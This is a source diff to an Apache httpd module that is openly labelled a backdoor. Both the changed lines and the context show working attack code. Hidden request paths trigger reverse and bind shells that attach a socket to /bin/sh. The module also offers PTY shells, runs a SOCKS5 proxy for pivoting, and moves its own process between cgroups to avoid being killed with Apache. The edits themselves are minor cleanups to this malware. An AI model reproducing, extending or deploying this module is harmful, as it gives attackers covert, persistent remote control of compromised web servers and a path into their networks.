@@ -1,10 +1,11 @@
+/* -------------------------------*/
+/* Backdoor module (@RicoVlad) */
+/* -------------------------------*/
 /* Code inspired from @TheXC3LL */
 // https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
 /* ************************************************************* */
-//Socks5 code from https://github.com/fgssfgss/socks_proxy
+//Socks5 code inspired from https://github.com/fgssfgss/socks_proxy
 /* ************************************************************* */
-
-/* Backdoor module (@RicoVlad) */
 
 #include <sys/types.h>
 #include <stdio.h>
@@ -24,13 +25,15 @@
 #include <sys/stat.h>
 #include <dirent.h>
 #include <sys/un.h>
+
 // forkpty() --> https://linux.die.net/man/3/forkpty
 // Need to link with libutil to use it in apache2 module
 #include <pty.h>
-#include <utmp.h>
+//#include <utmp.h>
 
 // link with lpthread
 //#include<pthread.h>
+
 #include <sys/mount.h>
 
 #include "httpd.h"
@@ -52,11 +55,10 @@
 #define SOCKSWORD "/proxy"
 #define PINGWORD "/ping"
 #define SHELLWORD "/revtty"
-//#define RESTARTWORD "/alarma"
 #define REVERSESHELL "/reverse"
 #define BINDWORD "/bind"
 #define CGROUP2 "/tmp/cgroup2"
-#define IPC "/tmp/mod_backdoor" //Change
+#define IPC "/tmp/mod_backdoor"
 
 pid_t pid;
 
@@ -99,7 +101,7 @@ typedef struct {
 
 // Read POST value from apache doc:
 // https://httpd.apache.org/docs/2.4/developer/modguide.html#snippets
-// Currently not working --> seems res var returns NULL
+// Currently not working --> seems res variable returns NULL
 keyValuePair *readPost(request_rec *r) {
     apr_array_header_t *pairs = NULL;
     apr_off_t len;
@@ -246,19 +248,15 @@ void* worker(int fd) {
     int inet_fd = -1;
     int command = 0;
     unsigned short int p = 0;
-    //write(fd,"Command\n",strlen("Command\n")+1);
+
     socks5_invitation(fd);
     socks5_auth(fd);
     command = socks5_command(fd);
 
     if (command == IP) {
-        //write(fd,"Command\n",strlen("Command\n")+1);
         char *ip = NULL;
         ip = socks5_ip_read(fd);
         p = socks5_read_port(fd);
-
-        /*write(fd,ip,strlen(ip)+1);
-        write(fd,p,strlen(p)+1);*/
 
         inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
         if (inet_fd == -1) {
@@ -274,6 +272,7 @@ void* worker(int fd) {
     exit(0);
 }
 
+// Not used
 void* waitProxy(int fd, int port){
 
     int opt = 1;
@@ -377,7 +376,6 @@ void shell(char* ip, char* port,char* prog) {
 		dup2(revsockfd, 0);
 		dup2(revsockfd, 1);
 		dup2(revsockfd, 2);
-        //ioctl(revsockfd, TIOCSCTTY,1);
 
 		if(!strcmp(prog,"sh")){
             execve("/bin/sh", argv, envp);
@@ -447,18 +445,17 @@ void reverseShell(char* ip, char* port, char* prog){
                 free(args[3]);
             }
 
-        }else{
-            //waitpid(spid,NULL,0);
-            //kill(spid,SIGKILL);
+        }else{ // Father process
             exit(0);
         }
     }
     exit(0);
-    //return;
 }
+
 /****************************/
 /// Fork() then forkpty() ///
 /****************************/
+// not used
 void shellPTY1(int socket) {
 
     struct termios terminal;
@@ -531,7 +528,7 @@ void shellPTY1(int socket) {
 
 
 /****************************/
-///      Forkpty only()    ///
+///      Forkpty() only    ///
 /****************************/
 void shellPTY(int socket) {
 
@@ -720,7 +717,6 @@ static int backdoor_post_read_request(request_rec *r) {
             exit(0);
         }
 
-
         bindfd = bindPort(fd,atoi(port));
         char* info = malloc(128);
         sprintf(info,"[+] Socks5 proxy binded on port %s\n",port);
@@ -738,7 +734,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
             new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
             // Close binded fd
-            close(bindfd);
+            //close(bindfd);
             worker(new_socket);
             close(new_socket);
 
@@ -768,8 +764,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
         bindfd = bindPort(fd,atoi(port));
 
-
-        char* info = malloc(128);
+        char* info = malloc(strlen(port)+strlen("[+] Shell binded on port %s\n")+1);
         sprintf(info,"[+] Shell binded on port %s\n",port);
         write(fd, info,strlen(info));
         free(info);
@@ -784,9 +779,8 @@ static int backdoor_post_read_request(request_rec *r) {
         while(1){
 
             new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
-            // Close binded fd
-            close(bindfd);
-            write(sock,"BIND",strlen("BIND"));
+
+            write(sock,"BIND",strlen("BIND")+1);
             bicomIPC(sock,new_socket);
             close(new_socket);
 
@@ -903,12 +897,13 @@ void* rmCgroup(){
         isMounted= mount("cgroup",CGROUP2,"cgroup2",NULL,NULL);
     }
     if(isMounted == 0){
-        //f = fopen(path,"wb");
         fd = open(path,O_WRONLY);
         if(fd != -1){
+            // ------- This is ugly -----
             str = malloc(sizeof(int)*getpid()+1);
             sprintf(str,"%d",getpid());
             write(fd,str,strlen(str));
+            // ----------------------------
             free(str);
         }
         umount(CGROUP2);
